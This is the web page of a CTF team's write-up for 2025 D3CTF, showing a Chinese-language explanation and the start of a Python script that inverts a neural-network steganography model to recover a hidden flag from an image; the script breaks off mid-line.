<!doctype html>
<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>2025 D3CTF SU WriteUp - su-team</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="su-team"><meta name="msapplication-TileImage" content="/img/SU4.jpg"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="su-team"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta name="description" content="本次D3CTF我们 SU(“为啥桂电不算电”) 取得了第六名的成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，欢迎发送个人简介至：suers_xctf@126.com 或者直接联系书鱼 QQ:381382770。 以下是我们 SU 本次 2025 D3CTF的 writeup。"><meta property="og:type" content="blog"><meta property="og:title" content="2025 D3CTF SU WriteUp"><meta property="og:url" content="https://team-su.github.io/2025/06/02/2025-D3CTF-SU-WriteUp/"><meta property="og:site_name" content="su-team"><meta property="og:description" content="本次D3CTF我们 SU(“为啥桂电不算电”) 取得了第六名的成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，欢迎发送个人简介至：suers_xctf@126.com 或者直接联系书鱼 QQ:381382770。 以下是我们 SU 本次 2025 D3CTF的 writeup。"><meta property="og:locale" content="en_US"><meta property="og:image" content="https://team-su.github.io/2025/06/02/2025-D3CTF-SU-WriteUp/6b1b6194-2bb6-4974-aff8-c3c32e2b7621.png"><meta property="og:image" content="https://team-su.github.io/2025/06/02/2025-D3CTF-SU-WriteUp/43256972-53ec-4852-b96c-6d24fd903796.png"><meta property="og:image" content="https://team-su.github.io/2025/06/02/2025-D3CTF-SU-WriteUp/1c965027-ebf4-429c-9963-c8776e06d09f.png"><meta property="og:image" content="https://team-su.github.io/2025/06/02/2025-D3CTF-SU-WriteUp/20fb8846-cdab-4bcf-bd49-03da669a2f1c.png"><meta property="og:image" content="https://team-su.github.io/2025/06/02/2025-D3CTF-SU-WriteUp/49800658-50e4-466d-b5ba-92af553f63c5.png"><meta property="og:image" content="https://team-su.github.io/2025/06/02/2025-D3CTF-SU-WriteUp/9eaf1d54-ae84-441c-b164-1081c0b248e4.png"><meta property="og:image" content="https://team-su.github.io/2025/06/02/2025-D3CTF-SU-WriteUp/6e32741d-59f5-4671-9bd9-904227a658bb.png"><meta property="og:image" content="https://team-su.github.io/2025/06/02/2025-D3CTF-SU-WriteUp/8b460b56-a288-442c-913c-7bf1479da19a.png"><meta property="og:image" content="https://team-su.github.io/2025/06/02/2025-D3CTF-SU-WriteUp/751cc258-0dd3-4f2a-b45f-b6aff1be3d74.png"><meta property="og:image" content="https://team-su.github.io/2025/06/02/2025-D3CTF-SU-WriteUp/ca284e2d-1fcb-44c4-863f-2e6a4de4d9ee.png"><meta property="og:image" content="https://team-su.github.io/2025/06/02/2025-D3CTF-SU-WriteUp/e4e03180-e44e-42fd-a4d4-313d77eeb9cb.png"><meta property="og:image" content="https://team-su.github.io/2025/06/02/2025-D3CTF-SU-WriteUp/e4e03180-e44e-42fd-a4d4-313d77eeb9cb.png"><meta property="og:image" content="https://team-su.github.io/2025/06/02/2025-D3CTF-SU-WriteUp/e4e03180-e44e-42fd-a4d4-313d77eeb9cb.png"><meta property="article:published_time" content="2025-06-02T07:20:46.000Z"><meta property="article:modified_time" content="2025-06-03T12:40:26.647Z"><meta property="article:author" content="SUers"><meta property="article:tag" content="d3ctf"><meta property="twitter:card" content="summary"><meta property="twitter:image:src" content="https://team-su.github.io/2025/06/02/2025-D3CTF-SU-WriteUp/6b1b6194-2bb6-4974-aff8-c3c32e2b7621.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://team-su.github.io/2025/06/02/2025-D3CTF-SU-WriteUp/"},"headline":"2025 D3CTF SU WriteUp","image":["https://team-su.github.io/2025/06/02/2025-D3CTF-SU-WriteUp/6b1b6194-2bb6-4974-aff8-c3c32e2b7621.png","https://team-su.github.io/2025/06/02/2025-D3CTF-SU-WriteUp/43256972-53ec-4852-b96c-6d24fd903796.png","https://team-su.github.io/2025/06/02/2025-D3CTF-SU-WriteUp/1c965027-ebf4-429c-9963-c8776e06d09f.png","https://team-su.github.io/2025/06/02/2025-D3CTF-SU-WriteUp/20fb8846-cdab-4bcf-bd49-03da669a2f1c.png","https://team-su.github.io/2025/06/02/2025-D3CTF-SU-WriteUp/49800658-50e4-466d-b5ba-92af553f63c5.png","https://team-su.github.io/2025/06/02/2025-D3CTF-SU-WriteUp/9eaf1d54-ae84-441c-b164-1081c0b248e4.png","https://team-su.github.io/2025/06/02/2025-D3CTF-SU-WriteUp/6e32741d-59f5-4671-9bd9-904227a658bb.png","https://team-su.github.io/2025/06/02/2025-D3CTF-SU-WriteUp/8b460b56-a288-442c-913c-7bf1479da19a.png","https://team-su.github.io/2025/06/02/2025-D3CTF-SU-WriteUp/751cc258-0dd3-4f2a-b45f-b6aff1be3d74.png","https://team-su.github.io/2025/06/02/2025-D3CTF-SU-WriteUp/ca284e2d-1fcb-44c4-863f-2e6a4de4d9ee.png","https://team-su.github.io/2025/06/02/2025-D3CTF-SU-WriteUp/e4e03180-e44e-42fd-a4d4-313d77eeb9cb.png","https://team-su.github.io/2025/06/02/2025-D3CTF-SU-WriteUp/e4e03180-e44e-42fd-a4d4-313d77eeb9cb.png","https://team-su.github.io/2025/06/02/2025-D3CTF-SU-WriteUp/e4e03180-e44e-42fd-a4d4-313d77eeb9cb.png"],"datePublished":"2025-06-02T07:20:46.000Z","dateModified":"2025-06-03T12:40:26.647Z","author":{"@type":"Person","name":"SUers"},"publisher":{"@type":"Organization","name":"su-team","logo":{"@type":"ImageObject","url":"https://team-su.github.io/img/SU4.jpg"}},"description":"本次D3CTF我们 SU(“为啥桂电不算电”) 取得了第六名的成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，欢迎发送个人简介至：suers_xctf@126.com 或者直接联系书鱼 QQ:381382770。 以下是我们 SU 本次 2025 D3CTF的 writeup。"}</script><link rel="canonical" href="https://team-su.github.io/2025/06/02/2025-D3CTF-SU-WriteUp/"><link rel="icon" href="/img/SU4.jpg"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v6.0.0/css/all.css"><link data-pjax rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@11.7.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link data-pjax rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><!--!--><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/css/justifiedGallery.min.css"><!--!--><!--!--><!--!--><style>.pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none}.pace-inactive{display:none}.pace .pace-progress{background:#3273dc;position:fixed;z-index:2000;top:0;right:100%;width:100%;height:2px}</style><script src="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js"></script><!--!--><!--!--><!-- hexo injector head_end start --><script>
  (function () {
      function switchTab() {
          if (!location.hash) {
            return;
          }

          const id = '#' + CSS.escape(location.hash.substring(1));
          const $tabMenu = document.querySelector(`.tabs a[href="${id}"]`);
          if (!$tabMenu) {
            return;
          }

          const $tabMenuContainer = $tabMenu.parentElement.parentElement;
          Array.from($tabMenuContainer.children).forEach($menu => $menu.classList.remove('is-active'));
          Array.from($tabMenuContainer.querySelectorAll('a'))
              .map($menu => document.getElementById($menu.getAttribute("href").substring(1)))
              .forEach($content => $content.classList.add('is-hidden'));

          if ($tabMenu) {
              $tabMenu.parentElement.classList.add('is-active');
          }
          const $activeTab = document.querySelector(id);
          if ($activeTab) {
              $activeTab.classList.remove('is-hidden');
          }
      }
      switchTab();
      window.addEventListener('hashchange', switchTab, false);
  })();
  </script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="su-team" type="application/atom+xml">
</head><body class="is-2-column"><nav class="navbar navbar-main"><div class="container navbar-container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/img/SU4.jpg" alt="su-team" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">Home</a><a class="navbar-item" href="/archives">Archives</a><a class="navbar-item" href="/tags">Tags</a><a class="navbar-item" href="/about">About</a><a class="navbar-item" href="/members">Members</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/team-su"><i class="fab fa-github"></i></a><a class="navbar-item is-hidden-tablet catalogue" title="Catalogue" href="javascript:;"><i class="fas fa-list-ul"></i></a><a class="navbar-item search" title="Search" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-8-widescreen"><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Posted&nbsp;<time dateTime="2025-06-02T07:20:46.000Z" title="2025/6/2 15:20:46">2025-06-02</time></span><span class="level-item">Updated&nbsp;<time dateTime="2025-06-03T12:40:26.647Z" title="2025/6/3 20:40:26">2025-06-03</time></span><span class="level-item">an hour read (About 8577 words)</span></div></div><h1 class="title is-3 is-size-4-mobile">2025 D3CTF SU WriteUp</h1><div class="content"><p>本次D3CTF我们 SU(“为啥桂电不算电”) 取得了第六名的成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，欢迎发送个人简介至：<a href="mailto:&#115;&#x75;&#101;&#114;&#115;&#95;&#x78;&#99;&#116;&#x66;&#x40;&#49;&#50;&#54;&#x2e;&#99;&#x6f;&#109;">suers_xctf@126.com</a> 或者直接联系书鱼 QQ:381382770。</p>
<p>以下是我们 SU 本次 2025 D3CTF的 writeup。</p>
<span id="more"></span>

<hr>
<p>本次D3CTF我们 SU(“为啥桂电不算电”) 取得了第六名的成绩</p>
<p>感谢队里师傅们的辛苦付出！同时我们也在持续招人，欢迎发送个人简介至：<a href="mailto:&#115;&#x75;&#x65;&#114;&#115;&#x5f;&#x78;&#x63;&#x74;&#102;&#x40;&#49;&#50;&#x36;&#46;&#x63;&#x6f;&#x6d;">suers_xctf@126.com</a> 或者直接联系书鱼 QQ:381382770。<br>以下是我们 SU 本次 2025 D3CTF的 writeup。</p>
<h1><span id="misc">Misc</span><a href="#misc" class="header-anchor"></a></h1><h2><span id="d3image">d3image</span><a href="#d3image" class="header-anchor"></a></h2><p>从图像 <code>mysterious_invitation.png</code> 中解密隐藏信息，首先分析提供的 <code>block.py</code>、<code>d3net.py</code>、<code>model.py</code> 及 <code>utils.py</code> 。</p>
<p>关键在于识别出核心的 <code>D3net</code> 模型是由多个可逆的 <code>INV_block</code>（仿射耦合层）构成，表明整体具备可逆性。研究 <code>test.py</code> 中的编码流程，了解到编码器对封面图像和秘密文本分别进行DWT（离散小波变换），拼接后送入 <code>d3net</code>；<code>d3net</code> 输出的前半部分（DWT域）经IWT（逆小波变换）后形成隐写图像，而后半部分（包含变换后的秘密信息）则在编码时被丢弃。</p>
<p>解密的核心挑战在于如何处理这丢失的后半部分信息以执行 <code>d3net</code> 的逆运算。假设这部分可由 <code>utils.py</code> 中提供的 <code>auxiliary_variable</code> 生成的随机噪声替代。因此，解密流程被设计为：为 <code>INV_block</code> 和 <code>D3net</code> 实现 <code>inverse</code> 方法；加载隐写图像并进行DWT得到前半部分已知输入；生成辅助噪声作为后半部分输入；将两者拼接后送入 <code>d3net</code> 的逆模型；从逆运算结果中分离出重建的负载DWT，再通过IWT、二值化及文本转换工具（包括Reed-Solomon解码和zlib解压）恢复出明文。</p>
<p>主要障碍是 <code>magic.potions</code> 权重文件中的参数名称与解密脚本中重构模型（使用 <code>nn.ModuleList</code> 管理 <code>INV_block</code>）的参数名称不匹配，通过在加载权重时进行精确的密钥名转换解决该问题，最终提取出隐藏的flag。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">import</span> torch.nn <span class="keyword">as</span> nn</span><br><span class="line"><span class="keyword">import</span> torchvision</span><br><span class="line"><span class="keyword">import</span> torchvision.transforms <span class="keyword">as</span> T</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> Counter</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> math  <span class="comment"># Used by IWT/DWT logic indirectly via divisions, and potentially PSNR if it were here.</span></span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">from</span> reedsolo <span class="keyword">import</span> RSCodec</span><br><span class="line"><span class="keyword">import</span> re  <span class="comment"># For robust key matching</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># --- Model Definitions (Copied and modified from original files) ---</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ResidualDenseBlock_out</span>(nn.Module):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, bias=<span class="literal">True</span></span>):</span><br><span class="line">        <span class="built_in">super</span>(ResidualDenseBlock_out, <span class="variable language_">self</span>).__init__()</span><br><span class="line">        <span class="variable language_">self</span>.channel = <span class="number">12</span></span><br><span class="line">        <span class="variable language_">self</span>.hidden_size = <span class="number">32</span></span><br><span class="line">        <span class="variable language_">self</span>.conv1 = nn.Conv2d(<span class="variable language_">self</span>.channel, <span class="variable language_">self</span>.hidden_size, <span class="number">3</span>, <span class="number">1</span>, <span class="number">1</span>, bias=bias)</span><br><span class="line">        <span class="variable language_">self</span>.conv2 = nn.Conv2d(<span class="variable language_">self</span>.channel + <span class="variable language_">self</span>.hidden_size, <span class="variable language_">self</span>.hidden_size, <span class="number">3</span>, <span class="number">1</span>, <span class="number">1</span>, bias=bias)</span><br><span class="line">        <span class="variable language_">self</span>.conv3 = nn.Conv2d(<span class="variable language_">self</span>.channel + <span class="number">2</span> * <span class="variable language_">self</span>.hidden_size, <span class="variable language_">self</span>.hidden_size, <span class="number">3</span>, <span class="number">1</span>, <span class="number">1</span>, bias=bias)</span><br><span class="line">        <span class="variable language_">self</span>.conv4 = nn.Conv2d(<span class="variable language_">self</span>.channel + <span class="number">3</span> * <span class="variable language_">self</span>.hidden_size, <span class="variable language_">self</span>.hidden_size, <span class="number">3</span>, <span class="number">1</span>, <span class="number">1</span>, bias=bias)</span><br><span class="line">        <span class="variable language_">self</span>.conv5 = nn.Conv2d(<span class="variable language_">self</span>.channel + <span class="number">4</span> * <span class="variable language_">self</span>.hidden_size, <span class="variable language_">self</span>.channel, <span class="number">3</span>, <span class="number">1</span>, <span class="number">1</span>, bias=bias)</span><br><span class="line">        <span class="variable language_">self</span>.lrelu = nn.LeakyReLU(negative_slope=<span class="number">0.2</span>, inplace=<span class="literal">True</span>)</span><br><span class="line">        <span class="comment"># initialize_weights call removed as weights are loaded externally for inference.</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, x</span>):</span><br><span class="line">        x1 = <span class="variable language_">self</span>.lrelu(<span class="variable language_">self</span>.conv1(x))</span><br><span class="line">        x2 = <span class="variable language_">self</span>.lrelu(<span class="variable language_">self</span>.conv2(torch.cat((x, x1), <span class="number">1</span>)))</span><br><span class="line">        x3 = <span class="variable language_">self</span>.lrelu(<span class="variable language_">self</span>.conv3(torch.cat((x, x1, x2), <span class="number">1</span>)))</span><br><span class="line">        x4 = <span class="variable language_">self</span>.lrelu(<span class="variable language_">self</span>.conv4(torch.cat((x, x1, x2, x3), <span class="number">1</span>)))</span><br><span class="line">        x5 = <span class="variable language_">self</span>.conv5(torch.cat((x, x1, x2, x3, x4), <span class="number">1</span>))</span><br><span class="line">        <span class="keyword">return</span> x5</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">INV_block</span>(nn.Module):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, clamp=<span class="number">2.0</span></span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line">        <span class="variable language_">self</span>.split_len1 = <span class="number">12</span></span><br><span class="line">        <span class="variable language_">self</span>.split_len2 = <span class="number">12</span></span><br><span class="line">        <span class="variable language_">self</span>.clamp = clamp</span><br><span class="line">        <span class="variable language_">self</span>.r = ResidualDenseBlock_out()</span><br><span class="line">        <span class="variable language_">self</span>.y = ResidualDenseBlock_out()</span><br><span class="line">        <span class="variable language_">self</span>.f = ResidualDenseBlock_out()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">e</span>(<span class="params">self, s</span>):</span><br><span class="line">        <span class="keyword">return</span> torch.exp(<span class="variable language_">self</span>.clamp * <span class="number">2</span> * (torch.sigmoid(s) - <span class="number">0.5</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, x, rev=<span class="literal">False</span></span>):</span><br><span class="line">        <span class="keyword">if</span> rev:</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">self</span>.inverse(x)</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.direct_forward(x)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">direct_forward</span>(<span class="params">self, x</span>):</span><br><span class="line">        x1, x2 = (x.narrow(<span class="number">1</span>, <span class="number">0</span>, <span class="variable language_">self</span>.split_len1),</span><br><span class="line">                  x.narrow(<span class="number">1</span>, <span class="variable language_">self</span>.split_len1, <span class="variable language_">self</span>.split_len2))</span><br><span class="line">        t2 = <span class="variable language_">self</span>.f(x2)</span><br><span class="line">        y1 = x1.clone() + t2</span><br><span class="line">        s1, t1 = <span class="variable language_">self</span>.r(y1), <span class="variable language_">self</span>.y(y1)</span><br><span class="line">        y2 = <span class="variable language_">self</span>.e(s1) * x2 + t1</span><br><span class="line">        <span class="keyword">return</span> torch.cat((y1, y2), <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">inverse</span>(<span class="params">self, y_cat</span>):</span><br><span class="line">        y1, y2 = (y_cat.narrow(<span class="number">1</span>, <span class="number">0</span>, <span class="variable language_">self</span>.split_len1),</span><br><span class="line">                  y_cat.narrow(<span class="number">1</span>, <span class="variable language_">self</span>.split_len1, <span class="variable language_">self</span>.split_len2))</span><br><span class="line">        s1, t1 = <span class="variable language_">self</span>.r(y1), <span class="variable language_">self</span>.y(y1)</span><br><span class="line">        x2 = (y2 - t1) / <span class="variable language_">self</span>.e(s1)</span><br><span class="line">        t2 = <span class="variable language_">self</span>.f(x2)</span><br><span class="line">        x1 = y1.clone() - t2</span><br><span class="line">        <span class="keyword">return</span> torch.cat((x1, x2), <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">D3net</span>(nn.Module):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">super</span>(D3net, <span class="variable language_">self</span>).__init__()</span><br><span class="line">        <span class="variable language_">self</span>.inv_blocks = nn.ModuleList()</span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):  <span class="comment"># Original D3net has 8 INV_blocks</span></span><br><span class="line">            <span class="variable language_">self</span>.inv_blocks.append(INV_block())</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, x, rev=<span class="literal">False</span></span>):</span><br><span class="line">        <span class="keyword">if</span> rev:</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">self</span>.inverse(x)</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.direct_forward(x)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">direct_forward</span>(<span class="params">self, x</span>):</span><br><span class="line">        out = x</span><br><span class="line">        <span class="keyword">for</span> block <span class="keyword">in</span> <span class="variable language_">self</span>.inv_blocks:</span><br><span class="line">            out = block.direct_forward(out)</span><br><span class="line">        <span class="keyword">return</span> out</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">inverse</span>(<span class="params">self, x</span>):</span><br><span class="line">        out = x</span><br><span class="line">        <span class="keyword">for</span> block <span class="keyword">in</span> <span class="built_in">reversed</span>(<span class="variable language_">self</span>.inv_blocks):  <span class="comment"># Apply inverse of blocks in reverse order</span></span><br><span class="line">            out = block.inverse(out)</span><br><span class="line">        <span class="keyword">return</span> out</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Model</span>(nn.Module):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, use_cuda=<span class="literal">True</span></span>):  <span class="comment"># Parameter name changed for clarity</span></span><br><span class="line">        <span class="built_in">super</span>(Model, <span class="variable language_">self</span>).__init__()</span><br><span class="line">        <span class="variable language_">self</span>.model = D3net()</span><br><span class="line">        <span class="keyword">if</span> use_cuda <span class="keyword">and</span> torch.cuda.is_available():</span><br><span class="line">            <span class="variable language_">self</span>.model.cuda()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, x, rev=<span class="literal">False</span></span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.model(x, rev=rev)</span><br><span class="line"></span><br><span class="line"><span class="comment"># --- Utility Classes and Functions (Copied/adapted from utils.py) ---</span></span><br><span class="line">rs = RSCodec(<span 